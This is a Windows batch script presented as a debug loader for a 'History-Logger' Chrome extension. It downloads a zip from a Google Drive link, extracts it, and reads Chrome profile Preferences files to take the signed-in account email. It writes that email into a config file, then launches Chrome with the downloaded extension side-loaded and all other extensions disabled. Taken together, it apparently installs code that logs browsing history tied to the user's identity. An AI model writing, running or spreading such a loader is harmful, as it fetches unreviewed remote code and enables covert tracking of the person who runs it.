@echo off
setlocal EnableDelayedExpansion

echo ==================================================
echo  BOOTSTRAP DEBUG: History-Logger Extension Loader
echo ==================================================

REM 0) Remind user to close Chrome
echo [!] PLEASE CLOSE ALL CHROME WINDOWS BEFORE CONTINUING
pause

REM 1) Configuration
set "ZIP_URL=https://drive.google.com/uc?export=download&id=1_MrCTaWFitVrrapsDodqTZduIvWKHCtU"
set "SCRIPT_DIR=%~dp0"
set "WORKDIR=%SCRIPT_DIR%history-logger"

echo.
echo [Step 1] Preparing work folder: "%WORKDIR%"
if exist "%WORKDIR%" (
  echo   Deleting existing folder...
  rd /s /q "%WORKDIR%" || (
    echo   ERROR: Could not delete "%WORKDIR%"
    pause
    goto :end
  )
)
mkdir "%WORKDIR%" || (
  echo   ERROR: Could not create "%WORKDIR%"
  pause
  goto :end
)

echo.
echo [Step 2] Downloading extension.zip from Drive...
powershell -NoProfile -Command ^
  "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%WORKDIR%\ext.zip' -UseBasicParsing"
if errorlevel 1 (
  echo   ERROR: Download failed.
  pause
  goto :end
)

echo.
echo [Step 3] Extracting ext.zip...
powershell -NoProfile -Command ^
  "Expand-Archive -Path '%WORKDIR%\ext.zip' -DestinationPath '%WORKDIR%' -Force"
if errorlevel 1 (
  echo   ERROR: Unpacking failed.
  pause
  goto :end
)

echo.
echo [Step 4] Contents of work folder:
dir "%WORKDIR%"
if errorlevel 1 (
  echo   ERROR: Could not list directory.
  pause
  goto :end
)

echo.
echo [Step 5] Scanning Chrome profiles for signed-in email...
set "EMAIL="
for /D %%P in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
  if exist "%%P\Preferences" (
    for /f "usebackq delims=" %%E in (`
      powershell -NoProfile -Command ^
        "try { (Get-Content -Raw '%%P\Preferences' | ConvertFrom-Json).account_info.email } catch { '' }"
    `) do (
      if not defined EMAIL (
        set "EMAIL=%%E"
        echo   Found email in profile "%%~nP": !EMAIL!
      )
    )
  )
)
if not defined EMAIL (
  set "EMAIL=anonymous@demo.com"
  echo   No email found → defaulting to !EMAIL!
)

echo.
echo [Step 6] Writing config.json inside work folder...
(
  echo {^"userEmail^":^"!EMAIL!"^}
) > "%WORKDIR%\config.json" || (
  echo   ERROR: Failed to write config.json
  pause
  goto :end
)
echo   config.json contents:
type "%WORKDIR%\config.json"

echo.
echo [Step 7] Locating chrome.exe…

rem Try `where` first
set "CHROME_PATH="
for /f "delims=" %%I in ('where chrome.exe 2^>nul') do (
  set "CHROME_PATH=%%I"
  goto :FOUND_CHROME
)

rem Fallback to common installation paths
for %%I in (
  "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
  "%ProgramFiles%\Google\Chrome\Application\chrome.exe"
  "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
) do if exist "%%~I" (
  set "CHROME_PATH=%%~I"
  goto :FOUND_CHROME
)

:FOUND_CHROME
if not defined CHROME_PATH (
  echo ERROR: chrome.exe not found on this PC!
  echo Tried PATH and standard ProgramFiles locations.
  pause
  goto :end
) else (
  echo   chrome.exe found at: !CHROME_PATH!
)

echo.
echo [Step 8] Launching Chrome with load-extension…
start "" "!CHROME_PATH!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" "chrome://extensions"

:end
echo.
echo [DEBUG] Finished.  
echo If your extension isn’t visible on the extensions page, make sure “Developer mode” is ON.
pause
